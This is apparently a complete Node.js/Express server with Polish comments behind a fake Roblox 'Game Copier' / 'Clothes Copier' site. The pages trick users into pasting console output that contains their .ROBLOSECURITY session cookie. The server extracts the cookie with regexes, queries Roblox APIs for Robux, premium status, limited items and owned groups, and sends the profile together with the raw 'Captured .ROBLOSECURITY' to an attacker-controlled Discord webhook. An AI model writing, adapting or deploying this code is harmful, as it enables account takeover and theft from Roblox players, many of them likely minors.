const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ────────────────────────────────────────────────
//   Strona główna – wybór narzędzia
// ────────────────────────────────────────────────
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GameCopier & ClothesCopier</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0a0a14;
      color: #d0d8ff;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      text-align: center;
      max-width: 640px;
      padding: 40px 20px;
    }
    h1 {
      color: #00d4ff;
      font-size: 3.4rem;
      margin-bottom: 0.6em;
      text-shadow: 0 0 20px #00d4ff55;
    }
    .subtitle {
      font-size: 1.3rem;
      color: #a0a8ff;
      margin-bottom: 3rem;
    }
    .btn {
      display: inline-block;
      margin: 1.2rem;
      padding: 18px 54px;
      font-size: 1.4rem;
      font-weight: bold;
      color: white;
      background: linear-gradient(135deg, #ff3366, #ff6b6b);
      border: none;
      border-radius: 50px;
      text-decoration: none;
      transition: all 0.28s ease;
      box-shadow: 0 12px 30px rgba(255,51,102,0.35);
    }
    .btn:hover {
      transform: translateY(-5px);
      box-shadow: 0 22px 50px rgba(255,51,102,0.55);
      background: linear-gradient(135deg, #ff4d4d, #ff8787);
    }
    .btn.clothes {
      background: linear-gradient(135deg, #8b5cf6, #a78bfa);
    }
    .btn.clothes:hover {
      background: linear-gradient(135deg, #7c3aed, #c4b5fd);
    }
  </style>
</head>
<body>
<div class="container">
  <h1>GameCopier Tools</h1>
  <p class="subtitle">Wybierz narzędzie do pracy z kontem Roblox</p>
  
  <a href="/GameCopier"   class="btn">Game Copier</a>
  <a href="/ClothesCopier" class="btn clothes">Clothes Copier</a>
</div>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
//   Funkcja pomocnicza – generuje HTML checker'a
// ────────────────────────────────────────────────
function generateCheckerHTML(title) {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${title}</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0f0f17; color: #e0e0ff; margin: 0; padding: 20px; }
    .container { max-width: 780px; margin: 0 auto; }
    h1 { color: #6ab0ff; text-align: center; }
    textarea { width: 100%; min-height: 220px; background: #1a1a2e; color: #d0d0ff; border: 1px solid #334; border-radius: 8px; padding: 14px; font-family: Consolas, monospace; font-size: 14px; resize: vertical; margin: 16px 0; }
    button { background: #3b82f6; color: white; border: none; padding: 14px 36px; font-size: 16px; border-radius: 6px; cursor: pointer; display: block; margin: 0 auto 24px; }
    button:hover { background: #2563eb; }
    #result { background: #1a1a2e; border: 1px solid #334; border-radius: 8px; padding: 20px; min-height: 180px; white-space: pre-wrap; word-break: break-all; }
    .error { color: #ff6b6b; font-weight: bold; }
    .success { color: #4ade80; font-weight: bold; }
    .loading { color: #fbbf24; font-style: italic; }
    img#avatar { max-width: 160px; border-radius: 10px; border: 2px solid #334; margin: 12px 0; display: block; }
  </style>
</head>
<body>
<div class="container">
  <h1>${title}</h1>
  <p>Wklej dowolny tekst (PowerShell, konsola, nagłówki, JSON itp.)<br>Cookie (.ROBLOSECURITY) zostanie automatycznie wyciągnięte</p>
  <textarea id="input" placeholder="Wklej tutaj tekst..."></textarea>
  <button onclick="check()">Sprawdź & Wyślij na webhook</button>
  <div id="result"></div>
</div>

<script>
async function check() {
  const raw = document.getElementById('input').value.trim();
  const result = document.getElementById('result');
  result.innerHTML = '';
  if (!raw) {
    result.innerHTML = '<span class="error">Nic nie wklejono</span>';
    return;
  }

  let cookie = null;
  let match;

  // próba 1 – JSON / dev console
  match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
  if (match && match[1]) cookie = match[1].trim();

  // próba 2 – dłuższy fragment z -and-items
  if (!cookie) {
    match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
    if (match && match[1]) cookie = match[1].trim();
  }

  // próba 3 – klasyczny _|WARNING...
  if (!cookie) {
    match = raw.match(/_\\|WARNING[^"]{200,}/);
    if (match) cookie = match[0].trim();
  }

  // ostateczna próba – najdłuższy ciąg pasujący do formatu cookie
  if (!cookie) {
    const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
    if (fallback.length) {
      cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
    }
  }

  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY</span>';
    return;
  }

  result.innerHTML = '<span class="loading">Znaleziono cookie – sprawdzam i wysyłam na webhook...</span>';

  try {
    const res = await fetch('/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });

    if (!res.ok) throw new Error('Błąd serwera: ' + res.status);
    const json = await res.json();

    if (json.error) {
      result.innerHTML = \`<span class="error">Błąd: \${json.error}</span>\`;
      return;
    }

    let html = \`<span class="success">Konto sprawdzone i wysłane na webhook!</span><br><br>\`;
    if (json.avatarUrl) html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;

    html += \`
      <b>Username:</b> \${json.username || '?'}<br>
      <b>User ID:</b> \${json.userId || '?'}<br>
      <b>Premium:</b> \${json.hasPremium ? 'True' : 'False'}<br>
      <b>Email Verified:</b> \${json.emailVerified ? 'True' : 'False'}<br>
      <b>Robux:</b> \${json.robux?.toLocaleString('en-US') || 0}<br>
      <b>Headless:</b> \${json.hasHeadless ? 'True' : 'False'}<br>
      <b>Korblox:</b> \${json.hasKorblox ? 'True' : 'False'}<br>
      <b>MM2:</b> \${json.mm2Count || 0}<br>
      <b>AMP:</b> \${json.ampCount || 0}<br>
      <b>SAB:</b> \${json.sabCount || 0}<br>
      <b>JB:</b> \${json.jbCount || 0}<br>
    \`;

    result.innerHTML = html;
  } catch (err) {
    result.innerHTML = \`<span class="error">Błąd: \${err.message}</span>\`;
  }
}
</script>
</body>
</html>
  `;
}

// ────────────────────────────────────────────────
//   Game Copier
// ────────────────────────────────────────────────
app.get('/GameCopier', (req, res) => {
  res.send(generateCheckerHTML('Game Copier'));
});

// ────────────────────────────────────────────────
//   Clothes Copier (na razie taki sam checker – możesz później zmienić logikę)
// ────────────────────────────────────────────────
app.get('/ClothesCopier', (req, res) => {
  res.send(generateCheckerHTML('Clothes Copier'));
});

// ────────────────────────────────────────────────
//   Endpoint sprawdzający cookie (wspólny dla obu)
// ────────────────────────────────────────────────
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Brak lub niepoprawne cookie' });
  }

  try {
    // ── CSRF ───────────────────────────────────────
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Nie udało się pobrać X-CSRF-Token');

    // ── Dane użytkownika ───────────────────────────
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) throw new Error('Niepoprawne cookie');
    const userData = await userRes.json();

    // ── Email verified (przez asset Verified Email Badge) ──
    let emailVerified = false;
    try {
      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {}

    // ── Premium ────────────────────────────────────
    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}

    // ── Robux ──────────────────────────────────────
    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    // ── RAP (opcjonalnie – można usunąć jeśli za wolno) ──
    let rap = 0;
    try {
      const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (assetsRes.ok) {
        const assets = await assetsRes.json();
        rap = assets.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
      }
    } catch {}

    // ── Grupy na full owner (rank 255) ─────────────
    let groupsOwned = 0;
    try {
      const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (groupsRes.ok) {
        const groups = await groupsRes.json();
        groupsOwned = groups.data.filter(g => g.role.rank === 255).length;
      }
    } catch {}

    // ── Wiek konta ─────────────────────────────────
    let accountAgeDays = 0;
    let createdDate = null;
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          createdDate = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
        }
      }
    } catch {}

    // ── Avatar ─────────────────────────────────────
    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    // ── Gamepassy (MM2, AMP, SAB, JB) ──────────────
    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const jbIds  = [2219040, 2725211, 2296901, 56149618, 4974038, 2070427, 2218187];
    const allIds = [...mm2Ids, ...ampIds, ...sabIds, ...jbIds];

    const hasGamePasses = [];
    try {
      for (const passId of allIds) {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
          { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken, 'Accept': 'application/json' } }
        );
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
            hasGamePasses.push(passId);
          }
        }
      }
    } catch {}

    const mm2Count = hasGamePasses.filter(id => mm2Ids.includes(id)).length;
    const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
    const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
    const jbCount  = hasGamePasses.filter(id => jbIds.includes(id)).length;

    // ── Headless & Korblox ─────────────────────────
    let hasHeadless = false;
    let hasKorblox  = false;
    try {
      const headlessRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
      );
      if (headlessRes.ok) {
        const data = await headlessRes.json();
        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
      }

      const korbloxRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
      );
      if (korbloxRes.ok) {
        const data = await korbloxRes.json();
        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
      }
    } catch {}

    const result = {
      success: true,
      username: userData.name,
      userId: userData.id,
      hasPremium,
      robux,
      rap,
      groupsOwned,
      accountAgeDays,
      created: createdDate || 'błąd',
      avatarUrl,
      emailVerified,
      hasHeadless,
      hasKorblox,
      mm2Count,
      ampCount,
      sabCount,
      jbCount
    };

    // ── Wysyłka do webhooka (jeśli WEBHOOK istnieje) ──
    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [
              {
                color: 0x0F0F23,
                title: `<:User:1481761037257674872> ${userData.name}`,
                description: "**AVATAR**",
                thumbnail: { url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png" },
                fields: [
                  {
                    name: "┌─────── Account Stats ───────┐",
                    value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
                    inline: false
                  },
                  {
                    name: "**Info**",
                    value: `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
                           `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
                           `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
                    inline: true
                  },
                  {
                    name: "**Games**",
                    value: `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                           `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
                           `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
                           `<:JB:1481804052215103509> JB: **${jbCount}**`,
                    inline: true
                  },
                  {
                    name: "**Inventory**",
                    value: `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
                           `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
                    inline: true
                  }
                ],
                footer: { text: "24H! • " + new Date().toLocaleString('en-US') },
                timestamp: new Date().toISOString()
              },
              {
                color: 0x4B0082,
                title: "Captured .ROBLOSECURITY",
                description: `\`\`\`\n${cookie}\n\`\`\``,
                timestamp: new Date().toISOString()
              }
            ]
          })
        });
      } catch (e) {
        console.error("Błąd wysyłki webhook:", e.message);
      }
    }

    res.json(result);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Błąd wewnętrzny serwera' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Serwer działa na porcie ${PORT}`);
});
